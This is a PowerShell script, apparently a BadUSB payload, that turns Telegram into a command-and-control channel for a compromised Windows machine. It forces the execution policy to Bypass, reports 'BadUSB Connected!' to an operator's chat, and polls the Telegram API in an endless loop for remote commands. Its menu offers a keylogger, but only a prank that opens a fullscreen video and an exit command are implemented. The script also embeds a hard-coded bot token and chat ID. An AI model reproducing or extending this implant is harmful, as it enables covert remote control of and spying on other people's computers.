# Telegram configuration
$BOT_TOKEN = "7614493434:AAHDtLRMIO1EGCduKAAMxvwPdnHGyP2aP1U"
$CHAT_ID = "8065486104"

# Bypass execution policy
Set-ExecutionPolicy Bypass -Scope Process -Force

# Initial message
Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Body @{
    chat_id = $CHAT_ID
    text = "📡 BadUSB Connected!`nOptions:`n1 - Rickroll`n2 - Keylogger`nEnd - Exit"
}

# Command processing
while($true) {
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?timeout=60"
        if ($updates.result) {
            $lastUpdate = $updates.result[-1]
            $offset = $lastUpdate.update_id + 1
            $command = $lastUpdate.message.text

            switch ($command) {
                '1' {
                    # Enhanced Rickroll with browser detection
                    Start-Process "chrome.exe" "https://youtu.be/dQw4w9WgXcQ?autoplay=1&rel=0"
                    Start-Sleep 2
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.SendKeys]::SendWait("{F11}")
                }
                'End' {
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Body @{
                        chat_id = $CHAT_ID
                        text = "🔌 Terminating connection..."
                    }
                    exit
                }
            }
            # Acknowledge update
            Invoke-RestMethod "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$offset" | Out-Null
        }
    }
    catch {
        # Error handling
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds 2
}
